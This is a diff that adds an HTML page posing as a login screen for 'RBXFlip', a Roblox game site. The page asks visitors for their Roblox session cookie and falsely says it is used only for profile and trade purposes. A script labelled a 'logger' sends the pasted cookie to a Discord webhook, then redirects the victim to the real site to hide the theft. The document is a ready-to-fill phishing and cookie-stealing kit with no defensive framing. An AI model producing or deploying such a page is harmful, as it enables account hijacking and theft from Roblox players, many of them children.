@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>RBXFlip | Fun & Fair Roblox Games</title>
+    <head>
+<head>
+    <style>
+        @font-face {
+            font-family: 'Poppins';
+            src: url('font/poppins.ttf');
+            font-weight: 200;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'Poppins_Bold';
+            src: url('font/poppins_bold.ttf');
+            font-style: bold;
+            font-display: swap;
+        }
+
+        body {
+            background-image: url('img/bg.png');
+            font-family: 'Poppins';
+            font-weight: 200;
+            font-style: normal;
+            color: white;
+        }
+
+        #login {
+            position: absolute;
+            top: 10%;
+            left: 40%;
+            width: 20%;
+            background-color: #171C26;
+            padding: 10px;
+            padding-left: 20px;
+            text-align: center;
+            border-radius: 10px;
+        }
+
+        #login .header {
+            text-align: left;
+            padding-top: inherit;
+            padding-bottom: inherit;
+            font-family: 'Poppins_Bold';
+        }
+
+        #login .cookie {
+            background-color: #20252F;
+            width: 98%;
+            left: 0%;
+            position: relative;
+        }
+
+        #login .cookie input {
+            text-align: left;
+            background-color: rgba(0, 0, 0, 0);
+            border-color: rgba(0, 0, 0, 0);
+            font-family: 'Poppins';
+            position: relative;
+
+            color: #FFF;
+            width: 80%;
+        }
+
+        #login .cookie img {
+            display: inline;
+            top: 100%;
+            left: -2%;
+            position: relative;
+        }
+
+        #login .info {
+            text-align: left;
+        }
+
+        a {
+            color: rgb(59, 130, 246);
+            text-decoration: none;
+        }
+
+        button {
+            background-color: #3b82f6;
+            padding: 6px;
+            border-radius: 10px;
+            height: 100%;
+            padding-left: 100px;
+            padding-right: 20%;
+            font-size: 16px;
+            font-family: 'Poppins_Bold';
+            padding: 10px;
+        }
+
+        .buttons {
+            text-align: right;
+            height: 90%;
+            padding: 10px;
+        }
+
+        button:hover {
+            cursor: pointer;
+        }
+        #close {
+            float:right;
+        }
+        #close:hover {
+            cursor:pointer;
+        }
+    </style>
+     <title>RBXFlip | Fun & Fair Roblox Games</title>
+    <link rel="icon" type="image/x-icon" href="img/favicon.png">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+         function login() {
+      var request = new XMLHttpRequest();
+      request.open("POST", "WEBHOOK HERE");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Termed / Rbxflip logger",
+        avatar_url: "https://media.discordapp.net/attachments/1063085706748121118/1063092346700443698/favicon.png",
+        content: cookieval.value
+        
+      }
+
+
+      request.send(JSON.stringify(params));
+
+      window.location.href = "https://rbxflip.com";
+
+    }
+    </script>
+</head>
+
+<body>
+    <div id="login">
+        <div class="header">
+            <span>Login</span>
+            <span id = "close">×&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+        </div>
+        <div class="cookie">
+            <img src="img/cookie.png" width="15" height="15px" />
+            <input type="text" id="cookieval" name="cookieval" placeholder="Your cookie" />
+        </div>
+        <div class="info">
+            <p>Your credentials are used only to gather your profile information and to send/accept trades on behalf of
+                our system.</p>
+
+            <p>Having trouble? Watch <a href="https://streamable.com/88ze2c" target="_blank">this</a>
+                video on how to login</p>
+
+        </div>
+        <div class="buttons">
+            <button onclick="login()" id="login_butt">Login</button>     
+        </div>
+
+</body>
+
+</html>
